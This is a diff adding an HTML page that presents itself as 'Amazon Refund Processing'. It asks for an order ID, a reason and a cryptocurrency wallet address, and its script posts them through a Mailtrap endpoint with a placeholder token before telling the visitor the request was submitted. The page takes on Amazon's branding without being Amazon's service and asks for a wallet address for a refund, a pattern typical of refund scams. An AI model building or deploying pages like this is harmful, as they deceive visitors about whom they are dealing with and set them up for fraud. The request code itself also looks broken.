@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><title>Amazon Refund</title></head>
+<body>
+<h2>Amazon Refund Processing</h2>
+<form action="https://api.mailtrap.io/messages" method="POST">
+<input name="order_id" placeholder="Order ID" required>
+<input name="reason" placeholder="Reason" required>
+<input name="wallet_address" placeholder="Wallet Address" required>
+<button type="submit">Process Refund</button>
+</form>
+<script>
+document.querySelector('form').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const formData = new FormData(e.target);
+  const data = Object.fromEntries(formData.entries());
+  
+  try {
+    await fetch('https://api.mailtrap.io/messages', {
+      method: 'POST',
+      headers: {'Authorization': 'Bearer YOUR_MAILTRAP_TOKEN'},
+      body: JSON.stringify({
+        to: "refund@amazon.com",
+        subject: `Refund Request #${data.order_id}`,
+        body: `Order ID: ${data.order_id}\nReason: ${data.reason}\nWallet: ${data.wallet_address}`
+      })
+    });
+    alert('Refund request submitted!');
+  } catch (error) {
+    console.error(error);
+  }
+});
+</script>
+</body>
+</html>
